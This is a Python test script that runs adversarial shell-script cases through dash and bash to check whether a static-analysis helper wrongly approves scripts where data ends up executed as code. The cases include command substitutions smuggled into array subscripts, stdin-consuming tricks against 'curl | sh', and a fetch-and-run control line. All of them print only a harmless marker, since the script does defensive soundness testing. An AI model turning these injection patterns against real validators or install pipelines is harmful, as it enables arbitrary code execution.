#!/usr/bin/env python3
"""r13 adversarial census for the units helper (ATM-1217 review round 3 H1, fixer round 4). Oracle: real shells. Each case is a script in which the STATIC
parse shows no command that prints the marker: the marker text PW''NED / PW""NED appears only as data (a comment,
a quoted string, a here-document body, an alias value, a subscript in a value). A real shell that prints PWNED
therefore ran data as code or read the script from another point. UNSOUND = some real shell printed PWNED AND the
helper credited the file (exit 0). Modes: file argument (sh s.sh), stdin from a pipe (curl | sh), stdin from the
file (sh < s.sh); shells: dash, bash --posix, bash (bash only for the bash dialect). PATH holds stubs: curl prints a
shell line that prints the marker; foo consumes K bytes of stdin.
usage: r13_census.py HELPER OUT.tsv
"""
import json, os, subprocess, sys, tempfile, shutil, stat

H, OUT = sys.argv[1], sys.argv[2]
MARK = "PWNED"
SHELLS = {"posix": [["dash"], ["bash", "--posix"]], "bash": [["bash"]]}
MODES = ["file", "pipe", "seek"]


def run(argv, text, cwd, mode, stub):
    p = os.path.join(cwd, "s.sh")
    with open(p, "w") as fh:
        fh.write(text)
    for n in ("M", "d"):
        shutil.rmtree(os.path.join(cwd, n), ignore_errors=True)
    env = {"PATH": stub + ":/usr/bin:/bin", "HOME": cwd, "LC_ALL": "C"}
    try:
        if mode == "file":
            r = subprocess.run(argv + ["s.sh"], input=b"y\nhello\n", capture_output=True, timeout=10, cwd=cwd, env=env)
        elif mode == "pipe":
            r = subprocess.run(argv, input=text.encode(), capture_output=True, timeout=10, cwd=cwd, env=env)
        else:
            with open(p, "rb") as fh:
                r = subprocess.run(argv, stdin=fh, capture_output=True, timeout=10, cwd=cwd, env=env)
        return (r.stdout + r.stderr).decode("utf-8", "replace")
    except subprocess.TimeoutExpired:
        return "<timeout>"


def helper(d, text):
    r = subprocess.run([H, "-dialect", d], input=text.encode(), capture_output=True, timeout=30)
    try:
        doc = json.loads(r.stdout)
    except ValueError:
        doc = {}
    return r.returncode, doc


PAD = "x" * 9
PAYLOAD = "#" + PAD + "printf 'PW''NED\\n'"
K = 1 + len(PAD)
NEEDLES = {"funsub": "a[${ printf PW\"\"NED >&2; }]", "cmdsub": "a[$(printf PW\"\"NED >&2)]",
           "plain": "x$(printf PW\"\"NED >&2)", "existing": "PIPESTATUS[${ printf PW\"\"NED >&2; }]",
           "versinfo": "BASH_VERSINFO[$(printf PW\"\"NED >&2)]"}


def q(s):
    return "'" + s.replace("'", "'\\''") + "'"


def ctx(kind, body):
    return {"top": body, "brace": "{\n" + body + "\n}", "if": "if true; then\n" + body + "\nfi",
            "func": "g() {\n" + body + "\n}\ng", "sub": "(\n" + body + "\n)"}[kind]


def cases():
    out = []
    # F1 standard-input consumers (P8); the payload line follows the construct
    cons = {
        "head-c": "head -c %d >/dev/null" % K, "dd": "dd bs=1 count=%d status=none >/dev/null" % K,
        "head-c-pipe-first": "head -c %d | :" % K, "cmdsub": ": \"$(head -c %d)\"" % K,
        "assign-cmdsub": "v=$(head -c %d)" % K, "brace-redir-out": "{ head -c %d; } >/dev/null" % K,
        "subshell": "( head -c %d ) >/dev/null" % K, "while": "while :; do head -c %d >/dev/null; break; done" % K,
        "ifcond": "if head -c %d >/dev/null; then :; fi" % K, "case": "case x in x) head -c %d >/dev/null;; esac" % K,
        "hdoc-expansion": "cat >/dev/null <<E\n$(head -c %d)\nE" % K, "dev-stdin": "head -c %d </dev/stdin >/dev/null" % K,
        "symlink-stdin": "ln -sf /dev/stdin L; head -c %d <L >/dev/null" % K,
        "stub-foo": "foo", "rm-i-computed": "touch f; x=-i; rm $x f 2>/dev/null",
        "cat-and": "true && head -c %d >/dev/null" % K, "time": "time head -c %d >/dev/null 2>&1" % K,
        "not": "! head -c %d >/dev/null" % K, "arg-cmdsub": "mkdir -p \"$(head -c %d)\"" % K,
        "prefix-cmdsub": "v=\"$(head -c %d)\" mkdir -p d" % K, "env": "env head -c %d >/dev/null" % K,
        "nice": "nice head -c %d >/dev/null" % K, "exec-redir-word": "mkdir -p d >\"$(head -c %d)\"" % K,
        "func-before-def": "foo2\nfoo2() { :; }",
        "func-in-func-before-def": "h() { foo2; }\nh\nfoo2() { :; }",
        # controls the subset should credit and the shells must NOT be subverted by
        "ctl-hdoc": "head -c %d >/dev/null <<E\nabcdefghijkl\nE" % K, "ctl-herestr": "head -c %d >/dev/null <<<abcdefghijklm" % K,
        "ctl-pipe-later": "printf abcdefghijklm | head -c %d >/dev/null" % K, "ctl-bg": "head -c %d >/dev/null &\nwait" % K,
        "ctl-close": "head -c %d >/dev/null <&-" % K, "ctl-mkdir": "mkdir -p d", "ctl-rm-dd": "touch f; x=f; rm -f -- \"$x\"",
    }
    for cid, body in cons.items():
        for k in ("top", "brace", "if", "func", "sub"):
            if cid.startswith("func") and k != "top":
                continue
            for d in ("posix", "bash"):
                out.append(("F1-%s/%s/%s" % (cid, k, d), d, ctx(k, body) + "\n" + PAYLOAD + "\n"))
    # F2 data-to-code through builtins and expansions the subset allows (or might)
    ev = {
        "test-eq": "test \"$n\" -eq 1", "br-eq": "[ \"$n\" -eq 1 ]", "printf-d": "printf %d \"$n\"",
        "printf-star": "printf '%*s' \"$n\" x", "printf-T": "printf '%(%s)T' \"$n\"", "shift": "set -- a; shift \"$n\"",
        "exit-sub": "( exit \"$n\" )", "return": "f() { return \"$n\"; }\nf", "kill-l": "kill -l \"$n\"", "kill-0": "kill -0 \"$n\"",
        "wait": "wait \"$n\"", "wait-dd": "wait -- \"$n\"", "wait-p": "a=-p; wait \"$a\" \"$n\"", "cd": "cd \"$n\"",
        "ulimit": "ulimit -n \"$n\"", "umask": "umask \"$n\"", "type": "type \"$n\"",
        "break": "for i in 1; do break \"$n\"; done", "continue": "for i in 1; do continue \"$n\"; done",
        "echo": "echo \"$n\"", "pwd": "pwd \"$n\"", "times": "times \"$n\"", "cmd-v": "command -v \"$n\"",
        "setdd": "set -- \"$n\"", "set-comp": "set $n", "testv-pos": "a=-v; b=(1); [ \"$a\" \"$n\" ]",
        "test-eq-str": "[ \"$n\" = x ]", "test-1": "[ \"$n\" ]", "test-not": "[ ! \"$n\" ]", "test-n": "[ -n \"$n\" ]",
        "dbr-eq": "[[ $n == x ]]", "dbr-re": "[[ $n =~ x ]]", "dbr-n": "[[ -n $n ]]", "dbr-nt": "[[ $n -nt x ]]",
        "case": "case $n in x) ;; esac", "for": "for x in $n; do :; done", "default": "echo \"${u:-$n}\"",
        "alt": "echo \"${n:+$n}\"", "rem": "echo \"${n#x}\" \"${n%%x}\"", "pat": "echo \"${u#$n}\"", "at": "set -- \"$n\"; echo \"${@}\"",
        "hdoc": "cat <<E\n$n\nE", "srcidx": "echo \"${BASH_SOURCE[0]}\" \"$n\"", "assign": "x=$n; y=$x; echo \"$y\"",
        "export": "export x=$n", "local": "f() { local x=$n; }\nf", "readonly": "readonly x=\"$n\"",
        "printf-v-comp": "v=-v; printf \"$v\" \"$n\" x", "unset-comp": "b=(1); unset \"$n\"", "random": "RANDOM=$n",
        "optind": "OPTIND=$n", "seconds": "SECONDS=$n", "sub-lit": "b=(1); echo \"${b[$n]}\"",
        "glob": "echo $n", "testv-noarr": "a=-v; [ \"$a\" \"$n\" ]", "sub-noarr": "echo \"${PIPESTATUS[$n]}\"",
        "unset-noarr": "unset \"$n\"", "printf-v-noarr": "printf -v \"$n\" %s 1", "export-noarr": "export \"$n\"", "exec-cmd": "exec echo \"$n\"", "cd-p": "cd -P \"$n\"", "kill-s": "kill -s \"$n\" 0",
    }
    for nid, needle in NEEDLES.items():
        for cid, body in ev.items():
            for d in ("posix", "bash"):
                out.append(("F2-%s-%s/%s" % (cid, nid, d), d, "n=" + q(needle) + "\n" + body + "\n"))
    # F3 controls: static code that prints the marker (proves the oracle sees it) -- excluded from UNSOUND
    for d in ("posix", "bash"):
        out.append(("CTRL-static-marker/%s" % d, d, "printf 'PW''NED\\n'\n"))
        out.append(("CTRL-clean/%s" % d, d, "set -eu\nmkdir -p d\necho ok\n"))
        out.append(("CTRL-alias/%s" % d, d, "alias p=" + q("printf 'PW''NED\\n'") + "\np\n"))
        out.append(("CTRL-curl/%s" % d, d, "curl -s https://example.invalid/x.sh | sh\n"))
    return out


def main():
    cwd = tempfile.mkdtemp(prefix="r13c.")
    stub = os.path.join(cwd, "stub")
    os.makedirs(stub)
    for name, body in {"curl": "#!/bin/sh\nprintf '%s\\n' \"printf 'PW''NED\\\\n'\"\n",
                       "foo": "#!/bin/sh\nexec head -c %d >/dev/null\n" % K,
                       "foo2": "#!/bin/sh\nexec head -c %d >/dev/null\n" % K}.items():
        p = os.path.join(stub, name)
        with open(p, "w") as fh:
            fh.write(body)
        os.chmod(p, stat.S_IRWXU)
    rows, cnt, fam_live = [], {}, {}
    try:
        for cid, d, text in cases():
            pw = []
            for sh in SHELLS[d]:
                for m in MODES:
                    if MARK in run(sh, text, cwd, m, stub):
                        pw.append("%s:%s" % (" ".join(sh), m))
            rc, doc = helper(d, text)
            if cid.startswith("CTRL-"):
                cls = "CONTROL"
            elif pw and rc == 0:
                cls = "UNSOUND"
            elif pw:
                cls = "POSITIVE-CLOSED"
            elif rc == 0:
                cls = "INERT-credited"
            else:
                cls = "INERT-refused"
            fam = cid.split("/")[0]
            if pw:
                fam_live[fam.split("-")[0]] = fam_live.get(fam.split("-")[0], 0) + 1
            cnt[cls] = cnt.get(cls, 0) + 1
            rows.append("\t".join([cid, d, ",".join(pw) or "-", "rc=%d" % rc, (doc.get("error") or "")[:110], cls]))
        with open(OUT, "w") as fh:
            fh.write("\n".join(rows) + "\n")
        ctl = {r.split("\t")[0]: r for r in rows if r.startswith("CTRL-")}
        ok = all("rc=0" in ctl["CTRL-clean/%s" % d] and "\t-\t" in ctl["CTRL-clean/%s" % d] for d in ("posix", "bash"))
        ok = ok and all(MARK and ctl["CTRL-static-marker/%s" % d].split("\t")[2] != "-" for d in ("posix", "bash"))
        ok = ok and all(ctl["CTRL-alias/%s" % d].split("\t")[2] != "-" and "rc=0" not in ctl["CTRL-alias/%s" % d]
                        for d in ("posix",))
        ok = ok and all(ctl["CTRL-curl/%s" % d].split("\t")[2] != "-" for d in ("posix", "bash"))
        print("cases=%d %s controls=%s live-by-family=%s" % (len(rows), " ".join("%s=%d" % kv for kv in sorted(cnt.items())),
                                                             "ok" if ok else "FAILED", fam_live))
        return 0 if ok and cnt.get("UNSOUND", 0) == 0 else 1
    finally:
        shutil.rmtree(cwd, ignore_errors=True)


sys.exit(main())
